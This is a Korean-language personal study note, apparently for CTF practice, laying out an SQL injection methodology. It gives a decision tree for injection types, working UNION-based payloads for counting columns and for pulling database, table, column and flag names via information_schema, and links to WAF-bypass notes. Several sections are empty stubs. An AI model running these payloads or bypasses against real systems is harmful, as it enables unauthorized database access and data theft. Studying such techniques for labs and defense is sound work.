
## 📍 Phase 1: 타겟 분류

_바이블(`Bible.md`)에서 `'`를 던져 SQLi 취약점을 확인했다면, 가장 먼저 **'결과값이 어떻게 돌아오는지'** 확인해서 공격 루트를 확정한다._

1.  **화면에 게시글이나 유저 정보(데이터)가 직접 출력된다!**
   👉 [[Methodology - SQLi#루트 A UNION SQLi]] (가장 쉽고 파괴적임)
    
2.  **데이터는 안 보이지만, 쿼리가 참일 때와 거짓일 때 화면이 다르다!** (예: 참이면 '존재하는 아이디', 거짓이면 '없는 아이디')
   👉 [[Methodology - SQLi#루트 B Boolean Blind SQLi]] 
    
3.  **화면 변화는 없는데, 에러 메시지에 쿼리 결과가 섞여서 나온다!**
   👉[[Methodology - SQLi#루트 C Error-based SQLi]]
    
4.  **참/거짓 변화도 없고 에러도 안 난다. 완벽한 블라인드다!**
   👉[[Methodology - SQLi#루트 D Time-based SQLi]]
    

---

## 📍 Phase 2: 영점 사격


### 루트 A: UNION SQLi

_루트 A로 진입했다면, 두 쿼리를 합치기 위해 **기존 쿼리의 컬럼 개수**를 무조건 알아내야 한다._

- [ ] **컬럼 개수 파악 (`ORDER BY`)**
    
    - `ORDER BY 1--` , `ORDER BY 2--` ... 숫자를 늘려가다가 **에러가 나는 순간**의 직전 숫자가 컬럼 개수다! (예: 4에서 에러 나면 컬럼은 3개)
        
- [ ] **출력 포인트(표적지) 확인 (`UNION SELECT`)**
    
    - `UNION SELECT 1,2,3--` 을 입력해서 화면에 '2'라는 숫자가 뜨면? 아! 2번째 자리가 데이터를 화면에 뱉어내는 명당이구나!
        

### 루트 B: Boolean Blind SQLi


### 루트 C: Error-based SQLi


### 루트 D: Time-based SQLi



---

## 📍 Phase 3: 데이터 추출 (The Hacker's Routine)

_영점을 잡았으니, 이제 정해진 순서대로 DB의 뼈대를 털어먹는다. (이 순서를 건너뛰면 안 된다)_

1. **DB 이름 확인:** `UNION SELECT 1, database(), 3--`
    
2. **테이블 이름 털기:** `UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='아까찾은DB명'--`
    
3. **컬럼 이름 털기:** `UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='아까찾은테이블명'--`
    
4. **최종 데이터(플래그) 추출:** `UNION SELECT 1, flag, 3 FROM 아까찾은테이블명--`
    

---

## 📍 Phase 4: 방화벽(WAF) 조우 시 비상 프로토콜

**[[WAF 우회 Cheatsheet]]**

    
- [ ] 따옴표(`'`)가 막힘 ➡️ `[[WAF_따옴표_우회_Hex인코딩]]`
    
- [ ] `SELECT`나 쉼표(`,`)가 막힘 ➡️ `[[WAF_함수_쉼표_우회_SQLite전용]]` (어제 네가 뚫은 그 기법!)
    
- [ ] `admin` 글자가 막힘 ➡️ `[[WAF_문자열_우회_Reverse_Concat]]`